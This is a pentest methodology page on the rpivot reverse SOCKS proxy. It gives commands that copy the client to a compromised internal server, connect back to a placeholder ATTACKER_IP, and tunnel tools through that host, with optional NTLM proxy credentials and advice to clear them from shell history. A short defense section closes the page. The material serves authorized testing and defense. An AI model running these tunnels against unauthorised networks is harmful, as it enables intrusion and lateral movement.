---
layout: page
title: "rpivot"
subtitle: "A reverse SOCKS proxy that lets an internal web server call back to the attack host"
permalink: /methodology/pivoting/rpivot/
---

rpivot is a reverse SOCKS proxy written in Python. A client runs on a machine inside the network and connects outward to a server on the attack host. The server then exposes a SOCKS proxy that routes traffic through the client's connection. It suits a compromised internal web server that can make outbound connections but cannot be reached inbound. It can also authenticate through an NTLM HTTP proxy when the organisation requires one.

## Workflow

1. Start the rpivot server on the attack host. It opens a SOCKS listener and a port for the client to connect to.
2. Copy the rpivot directory to the target with `scp -r`.
3. Start the client on the target, pointing it at the attack host's server address and port.
4. Confirm the client reports that it has connected back to the server.
5. Point proxychains at the server's SOCKS port and run tools against internal hosts.
6. If the target needs an NTLM proxy, add the proxy and credential options to the client.

```bash
attacker$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
attacker$ scp -r rpivot USERNAME@PIVOT_IP:/home/USERNAME/
```

```bash
pivot$ python2.7 client.py --server-ip ATTACKER_IP --server-port 9999
Backconnecting to server ATTACKER_IP port 9999
```

When the target must authenticate through an NTLM HTTP proxy:

```bash
pivot$ python client.py --server-ip ATTACKER_IP --server-port 8080 --ntlm-proxy-ip PROXY_IP --ntlm-proxy-port 8081 --domain DOMAIN --username USERNAME --password PASSWORD
```

## What to look for

- The client prints the back-connect message. If it does not, check the server address and port and any firewall between the two.
- The SOCKS port on the server (9050 in the example) is what proxychains uses. Traffic reaching it exits through the internal client.
- Some targets hold the client connection open only briefly. A dropped client disconnects every proxied session.

## Pitfalls

- The tool is written for Python 2.7, as shown in the examples. Use an environment that runs it, or a maintained port.
- Credentials for the NTLM proxy appear on the command line. Remove them from shell history after use.
- As with other proxychains setups, use TCP connect scans only.

## Defense and prevention

Restrict outbound connections from web servers to the update and service endpoints they need. Monitor for persistent connections from servers to unfamiliar external hosts, and for Python scripts running from web server directories.
